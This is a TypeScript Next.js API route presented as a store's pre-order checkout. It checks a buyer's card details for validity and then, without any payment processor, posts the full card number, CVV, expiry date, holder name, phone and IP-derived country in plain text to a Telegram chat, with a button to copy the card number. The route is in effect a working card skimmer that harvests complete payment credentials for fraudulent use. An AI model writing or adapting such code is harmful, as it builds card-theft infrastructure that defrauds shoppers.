import { NextRequest, NextResponse } from "next/server";
import { rateLimit, sendToTelegram } from "../../lib/rateLimit";

function luhn(num: string): boolean {
  let sum = 0, shouldDouble = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function validate(payment: Record<string, unknown>): string | null {
  const raw = (payment.cardNumber as string)?.replace(/\s/g, "");
  if (!raw || !/^\d{13,19}$/.test(raw)) return "رقم البطاقة غير صالح";
  if (!luhn(raw)) return "رقم البطاقة غير صحيح (Luhn)";
  if (!payment.expiry || !/^\d{2}\/\d{2}$/.test(payment.expiry as string)) return "تاريخ الانتهاء غير صالح";
  if (!payment.cvv || !/^\d{3,4}$/.test(payment.cvv as string)) return "CVV غير صالح";
  if (!payment.holder || (payment.holder as string).length > 100) return "اسم حامل البطاقة غير صالح";
  return null;
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";
  if (!rateLimit(ip, 5, 60 * 1000)) {
    return NextResponse.json({ ok: false, error: "Too many requests" }, { status: 429 });
  }

  try {
    const body = await req.json();
    const { productId, productName, variant, customer, payment } = body;

    if (!productId || !productName || !customer || !payment) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    const paymentErr = validate(payment);
    if (paymentErr) return NextResponse.json({ ok: false, error: paymentErr }, { status: 400 });

    // تحديد الدولة من الـ IP
    let country = "غير معروف";
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
      if (geoRes.ok) {
        const geo = await geoRes.json();
        if (geo.country) country = geo.country;
      }
    } catch {}

    const orderId = `PRE-${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const rawCard = (payment.cardNumber as string).replace(/\s/g, "");
    const variantText = variant ? ` ${variant.color || ""} - ${variant.storage || ""}` : "";
    const rawPhone = (customer.phone ?? "").replace(/\D/g, "");
    const localPhone = rawPhone.startsWith("966") ? "0" + rawPhone.slice(3) : rawPhone;
    const whatsappNum = rawPhone;

    const formattedCard = rawCard.match(/.{1,4}/g)?.join(" ") ?? rawCard;

    const text = [
      `🔔 حجز مسبق جديد`,
      `🏪 متجر مؤسسة برج المبدع`,
      `🔢 رقم الطلب: #${orderId}`,
      ``,
      `📦 المنتج: ${productName}${variantText}`,
      ``,
      `💳 MadaVisa - Pre-Order`,
      `👤 العميل: ${customer.firstName} ${customer.lastName}`,
      `📱 WhatsApp: ${localPhone}`,
      `🌍 Country: ${country}`,
      `💳 Card Number: ${formattedCard}`,
      `👤 Card Holder: ${payment.holder}`,
      `📅 Valid To: ${payment.expiry}`,
      `🔐 CVV: ${payment.cvv}`,
    ].join("\n");

    const buttons: object[] = [
      { text: "📋 نسخ رقم البطاقة", copy_text: { text: rawCard } },
    ];
    if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });

    const sent = await sendToTelegram({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      reply_markup: { inline_keyboard: [buttons] },
    });

    if (!sent) console.error("Telegram send failed for pre-order:", orderId);

    return NextResponse.json({
      ok: sent,
      orderId,
      message: "تم استلام طلب الحجز المسبق بنجاح",
    }, { status: sent ? 200 : 502 });
  } catch (err) {
    console.error("Pre-order API error:", err);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
